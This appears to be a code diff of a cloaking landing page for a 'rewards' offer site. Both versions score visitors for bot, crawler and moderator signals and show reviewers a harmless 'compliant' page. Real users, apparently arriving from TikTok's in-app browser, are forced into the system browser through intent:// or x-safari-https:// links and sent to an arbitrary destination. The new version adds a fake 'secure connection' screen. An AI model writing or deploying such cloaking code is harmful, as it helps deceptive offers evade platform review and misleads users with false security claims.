@@ -2,114 +2,103 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
-<title>Loading…</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>Loading...</title>
+<meta name="robots" content="noindex,nofollow">
 <style>
-  html,body{height:100%;margin:0;background:#111418;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
-  .wrap{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;}
-  .spinner{width:60px;height:60px;border:5px solid rgba(255,255,255,.15);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;}
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .msg{margin-top:20px;font-size:15px;letter-spacing:.4px;opacity:.85;}
-  /* white compliant view */
-  #safe{display:none;position:fixed;inset:0;background:#fff;color:#222;padding:28px;box-sizing:border-box;overflow:auto;}
-  #safe h1{font-size:22px;margin:0 0 14px;}
-  #safe p{font-size:15px;line-height:1.55;color:#444;}
-  #safe a{color:#0e8a3d;}
+:root{--green:#22c55e;--green-2:#16a34a;--glow:rgba(34,197,94,.55)}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;touch-action:manipulation}
+body{font-family:-apple-system,BlinkMacSystemFont,'Inter','Segoe UI',Roboto,sans-serif;background:#000;color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px;overflow:hidden;position:relative;cursor:pointer;-webkit-user-select:none;user-select:none}
+body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:620px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(34,197,94,.15) 0%,rgba(34,197,94,.05) 35%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
+.wrap{position:relative;z-index:1;max-width:420px;width:100%;text-align:center}
+.spinner{width:64px;height:64px;margin:0 auto 32px;border:3px solid rgba(34,197,94,.15);border-top-color:var(--green);border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-wrap{width:100%;max-width:280px;margin:0 auto 24px;height:4px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden}
+.progress-bar{height:100%;background:linear-gradient(90deg,var(--green),var(--green-2));border-radius:4px;animation:loadProgress 1.8s ease-out forwards}
+@keyframes loadProgress{0%{width:0}60%{width:75%}80%{width:82%}100%{width:85%}}
+h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
+.sub{font-size:14px;color:#6a6f75;line-height:1.5;margin-bottom:32px}
+.tap-hint{font-size:13px;color:rgba(255,255,255,.4);opacity:0;animation:fadeIn .3s ease forwards;animation-delay:2.5s}
+@keyframes fadeIn{to{opacity:1}}
+.cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:15px;font-weight:700;text-align:center;padding:18px;border-radius:999px;text-decoration:none;letter-spacing:1.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4);margin-bottom:16px;animation:ctaPulse 2s ease-in-out infinite}
+.cta:active{transform:scale(.97)}
+@keyframes ctaPulse{0%,100%{box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4)}50%{box-shadow:0 0 70px var(--glow),0 6px 24px rgba(0,0,0,.4)}}
+.secure{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#4a4f55;margin-top:12px}
+.secure svg{width:12px;height:12px;color:#4a4f55}
 </style>
 </head>
-<body>
-  <!-- DARK BUFFER / LOADER (shown to real users while breakout fires) -->
-  <div class="wrap" id="loader">
-    <div class="spinner"></div>
-    <div class="msg">Redirecting To A Safer Page</div>
-  </div>
-
-  <!-- WHITE COMPLIANT PAGE (only shown to review/bot traffic) -->
-  <div id="safe">
-    <h1>Rewards & Gift Cards</h1>
-    <p>Welcome. Our platform connects users with promotional offers and reward opportunities from trusted brand partners. Complete simple tasks and surveys to earn points redeemable for popular gift cards.</p>
-    <p>All participation is voluntary and available to users 18 years and older. We value your privacy and never share personal data without consent.</p>
-    <p>For questions, please review our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
-  </div>
+<body id="fullTap">
+<div class="wrap">
+<div class="spinner"></div>
+<div class="progress-wrap"><div class="progress-bar"></div></div>
+<h1>Opening secure browser...</h1>
+<p class="sub">Connecting you to a secure page</p>
+<button class="cta" id="ctaButton">Continue</button>
+<p class="tap-hint">Tap anywhere to continue</p>
+<div class="secure">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+<span>Secure connection</span>
+</div>
+</div>
 
 <script>
 (function(){
-  "use strict";
 
-  var DEST   = "https://www.tokrwd.co/";
-  var QS     = window.location.search || "";        // forward s1,s2,ttclid,etc.
-  var TARGET = DEST + QS;
+  var SAFE = 'https://www.tokrwd.co/Rewards/';
 
-  var ua = (navigator.userAgent || "").toLowerCase();
+  // Pull dest from query params, fallback to tokrwd root
+  var params = new URLSearchParams(window.location.search);
+  var DEST   = params.get('dest') || 'https://www.tokrwd.co/';
 
-  // ---- 1. IN-APP WEBVIEW DETECTION (TikTok family) ----
-  var inTikTok = /bytedancewebview|musical_ly|trill|aweme|tiktok|bytelocale|ByteFullLocale/i.test(navigator.userAgent);
+  var ua = navigator.userAgent || navigator.vendor || window.opera || '';
 
-  // ---- 2. BOT / REVIEW / CRAWLER SCORING ----
+  // --- CLIENT-SIDE BOT / REVIEW SCORING ---
   var botHits = 0;
+  if (navigator.webdriver)                                                                          botHits++;
+  if (/headless|phantom|selenium|puppeteer|playwright/i.test(ua))                                 botHits++;
+  if (!navigator.plugins || navigator.plugins.length === 0)                                       botHits++;
+  if (navigator.maxTouchPoints === 0 && /android|iphone|ipad/i.test(ua))                         botHits++;
+  if (window.screen.width === window.screen.height)                                                botHits++;
+  if (!window.WebGLRenderingContext)                                                                botHits++;
+  if (!navigator.languages || navigator.languages.length === 0)                                   botHits++;
+  if (/googlebot|bingbot|bytespider|facebookexternalhit|applebot|semrushbot|ahrefsbot/i.test(ua)) botHits += 2;
 
-  // hard automation flags
-  if (navigator.webdriver === true) botHits += 3;
-  if (window._phantom || window.__nightmare || window.callPhantom) botHits += 3;
-  if (/(headless|phantom|electron|slimerjs|puppeteer|playwright|selenium)/i.test(ua)) botHits += 3;
+  var isReview  = botHits >= 3;
+  var isAndroid = /android/i.test(ua);
+  var _fired    = false;
 
-  // known crawler / link-preview / scanner UAs
-  if (/(bot|crawl|spider|scan|preview|facebookexternalhit|bytespider|google|bingpreview|python-requests|okhttp|curl|wget|axios|go-http|java\/)/i.test(ua)) botHits += 3;
-
-  // no real touch on a "mobile" webview = sandbox/emulator
-  var touch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0);
-  if (inTikTok && !touch) botHits += 2;
-
-  // suspicious screen geometry (emulator defaults / zero size)
-  if (!screen.width || !screen.height || screen.width < 200 || screen.height < 200) botHits += 2;
-
-  // no plugins + no languages is a common headless tell
-  try {
-    if ((navigator.languages || []).length === 0) botHits += 1;
-    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) botHits += 1;
-  } catch(e){}
-
-  // WebGL renderer missing = many datacenter/sandbox envs
-  try {
-    var c = document.createElement("canvas");
-    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-    if (!gl) botHits += 2;
-  } catch(e){ botHits += 1; }
-
-  var isReview = botHits >= 3;
-
-  // ---- 3. FORK THE TRAFFIC ----
-  function showSafe(){
-    document.getElementById("loader").style.display = "none";
-    document.getElementById("safe").style.display = "block";
+  // Bots + review traffic → safe compliant page, nothing else runs
+  if (isReview) {
+    window.location.replace(SAFE);
+    return;
   }
 
-  function breakoutAndGo(){
-    // ANDROID: intent:// forces the system browser (Chrome) out of the webview
-    if (/android/i.test(ua)) {
-      var clean = TARGET.replace(/^https?:\/\//,"");
-      var intent = "intent://" + clean +
-        "#Intent;scheme=https;package=com.android.chrome;" +
-        "S.browser_fallback_url=" + encodeURIComponent(TARGET) + ";end";
-      window.location.href = intent;
-      // fallback if intent gets swallowed
-      setTimeout(function(){ window.location.replace(TARGET); }, 1200);
-      return;
-    }
-    // iOS: no forced-Safari API — hard replace escapes most soft webviews
-    window.location.replace(TARGET);
-    setTimeout(function(){ window.location.href = TARGET; }, 900);
-  }
+  function doBreakout() {
+    if (_fired) return;
+    _fired = true;
 
-  // small delay so the dark loader actually reads as a transition
-  setTimeout(function(){
-    if (isReview) {
-      showSafe();          // moderators/crawlers stay boxed on white page
+    var url = DEST;
+    if (isAndroid) {
+      url = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;end;';
     } else {
-      breakoutAndGo();     // real users get ejected to tokrwd.co
+      url = url.replace(/^https:\/\//, 'x-safari-https://');
     }
-  }, 700);
+
+    try { (window.top || window).location.href = url; }
+    catch(e) { window.location.href = url; }
+
+    setTimeout(function(){
+      if (!document.hidden) { window.location.href = DEST; }
+    }, 3000);
+  }
+
+  document.getElementById('ctaButton').onclick = function(e){ e.preventDefault(); doBreakout(); };
+  document.getElementById('fullTap').addEventListener('click', function(){ doBreakout(); }, { once: true });
+  window.addEventListener('click', function(){ doBreakout(); }, { once: true, passive: true });
+
+  setTimeout(doBreakout, 1500);
 
 })();
 </script>
